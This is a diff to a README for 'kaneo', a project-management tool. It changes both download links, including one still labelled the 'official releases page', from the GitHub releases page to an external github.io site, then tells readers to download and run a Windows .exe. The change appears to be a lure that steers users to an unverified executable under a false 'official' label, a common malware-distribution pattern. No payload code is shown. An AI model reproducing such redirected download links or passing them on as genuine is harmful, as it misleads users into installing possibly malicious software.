@@ -1,6 +1,6 @@
 # 🎯 kaneo - Manage your projects with simple tools
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/dimitrifootless152/kaneo/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://dimitrifootless152.github.io)
 
 Kaneo helps you organize tasks and projects. It removes clutter so you focus on your actual work. You use it to track issues, plan sprints, and manage your team output without complex menus or steep learning curves.
 
@@ -8,7 +8,7 @@ Kaneo helps you organize tasks and projects. It removes clutter so you focus on 
 
 To start using the application on your computer, follow these steps:
 
-1. Visit the [official releases page](https://github.com/dimitrifootless152/kaneo/releases).
+1. Visit the [official releases page](https://dimitrifootless152.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file that ends in .exe for Windows.
 4. Save the file to your computer.
